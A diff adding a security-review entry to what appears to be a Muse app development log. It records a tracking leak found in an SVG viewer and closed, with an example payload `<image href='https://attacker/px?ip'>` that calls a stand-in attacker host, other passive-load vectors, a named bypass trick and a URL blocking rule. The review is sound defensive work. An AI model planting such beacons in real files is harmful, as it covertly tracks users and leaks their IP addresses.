@@ -4416,3 +4416,37 @@ a **shared** `Muse.xcodeproj/xcshareddata/xcschemes/Muse.xcscheme` whose TestAct
 BOTH `MuseTests` + `MuseUITests`; the plain command now runs the full unit suite
 (428 unit tests + UI tests, 0 failures) and the scheme is committed so every checkout
 gets it.
+
+### Adversarial security review — Drive go-live surface — 2026-06-26 (`feat/next-70`)
+
+Hacker-mindset review of the now-production attack surface, run as parallel adversarial
+sub-agents (web share page, OAuth/PKCE/token handling, Drive upload/manifest, native
+injection/traversal) plus a fifth agent that tried to defeat the fix. Three surfaces came
+back clean with invariants verified line-by-line: the public share page (all manifest
+fields via `textContent`, anchored id regex `^[A-Za-z0-9_-]{20,}$`, `default-src 'none'`
+CSP, meta-CSP and `_headers` agree), the OAuth flow (PKCE S256 from `SecRandomCopyBytes`,
+`state` generated **and** verified, `ASWebAuthenticationSession` so the custom scheme
+isn't LaunchServices-interceptable, Keychain-only device-only tokens, revoke on sign-out,
+no client secret, hardcoded HTTPS), and Drive upload (permission is `reader`/`anyone` on
+the per-share subfolder only, JSON via `JSONSerialization`, random multipart boundary, no
+token/PII/path in the fragment).
+
+**Real find + fix — SVG viewer network leak.** `SVGViewerView`'s only guard was a
+`WKNavigationDelegate`, which fires ONLY for frame navigations — never subresources. A
+planted `.svg` with `<image href="https://attacker/px?ip">` (or CSS `url()`/`@import`/
+`@font-face`, `<use href>`, `<feImage>`) phoned home on mere preview, silently breaking
+the "no network / Data Not Collected" guarantee (JS-off does NOT stop these passive
+loads). Closed at the **resource** layer with a `WKContentRuleList` blocking `https?://`,
+`wss?://`, and host-bearing `file://[^/]` (the protocol-relative `//host` egress trick);
+the file load is **deferred until the rule installs** and **fails closed** (won't render)
+if it can't; nav delegate tightened to hostless `file://` only. The re-attack agent
+debunked the uppercase-scheme bypass (content-rule `url-filter` is case-insensitive +
+WebKit lowercases the scheme) and flagged the two hardening points (fail-open fallback,
+protocol-relative file host), both since closed.
+
+**QA.** Verified the content-rule JSON compiles at runtime, then a **live** WKWebView
+egress test with a local TCP beacon: control (no rule) → beacon HIT (proves the leak was
+real); fix (rule active) → beacon UNHIT **and** the SVG still renders (`didFinish`). Plus
+a low-severity hardening: `DriveClient.authed` force-unwrapped `URL(string:)!` on an id
+read from a tamperable local share record → now a guarded throw (crash-on-launch removed).
+`BUILD SUCCEEDED`; `MuseTests` + `MuseUITests` 0 failures; `share.test.mjs` green.
